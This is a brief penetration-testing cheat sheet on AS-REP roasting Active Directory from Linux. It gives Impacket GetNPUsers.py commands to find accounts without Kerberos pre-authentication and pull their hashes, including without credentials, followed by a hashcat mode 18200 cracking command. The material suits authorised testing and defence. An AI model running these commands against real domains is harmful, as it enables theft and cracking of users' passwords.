# 09.01 AS-REP Roasting Linux

> Run `GetNPUsers.py -no-pass -usersfile` for unauthenticated AS-REP roasting and crack with hashcat mode 18200.

## Overview

Impacket's GetNPUsers.py performs AS-REP roasting from Linux, optionally without credentials by supplying a username list. With a valid domain account, it enumerates vulnerable users; with -no-pass and -usersfile it works unauthenticated. Output is saved in Hashcat format for offline cracking with mode 18200.

## Steps

- With a valid credential, run GetNPUsers.py domain/user to list DONT_REQ_PREAUTH accounts.
- Add -request to retrieve actual AS-REP hashes for all vulnerable accounts.
- Without credentials, use -no-pass -usersfile /tmp/users.txt with -format hashcat -outputfile.
- Errors for non-existent users (KDC_ERR_C_PRINCIPAL_UNKNOWN) are expected and can be ignored.
- Crack the resulting hashes with hashcat -m 18200.

## Commands

### GetNPUsers list vulnerable accounts

```bash
GetNPUsers.py <DOMAIN>.local/pixis
```

### GetNPUsers request hashes

```bash
GetNPUsers.py <DOMAIN>.local/pixis -request
```

### GetNPUsers unauthenticated with user list

```bash
GetNPUsers.py <DOMAIN>/ -dc-ip <TARGET> -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
```

### hashcat crack AS-REP

```bash
hashcat -m 18200 hashes.txt rockyou.txt
```
